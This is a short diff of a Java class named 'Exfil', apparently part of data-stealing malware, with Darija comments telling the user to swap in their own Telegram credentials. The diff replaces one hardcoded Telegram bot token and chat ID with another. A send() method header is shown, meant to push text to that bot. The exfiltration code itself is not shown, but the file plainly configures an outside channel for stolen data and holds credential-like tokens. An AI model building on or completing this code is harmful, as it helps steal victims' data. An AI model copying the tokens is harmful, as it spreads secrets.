@@ -10,8 +10,8 @@ import java.net.URLEncoder;
 
 public class Exfil {
     // Bdel hadou b dyalek
-    public static final String BOT_TOKEN = "8624726401:AAF0OfA_I0vxNPkeEucmLFCU6CBff7ynbUk"; 
-    public static final String CHAT_ID = "8431994335"; 
+    public static final String BOT_TOKEN = "9220967692:AAHVV7HnAzfFHPqPo8WclpJ6F63Qtcfre4Q"; 
+    public static final String CHAT_ID = "8723355077"; 
 
     // 1. Send Text (Thread bach maycrashich, bla HTML bach Markdown ykhdem)
     public static void send(String text) {
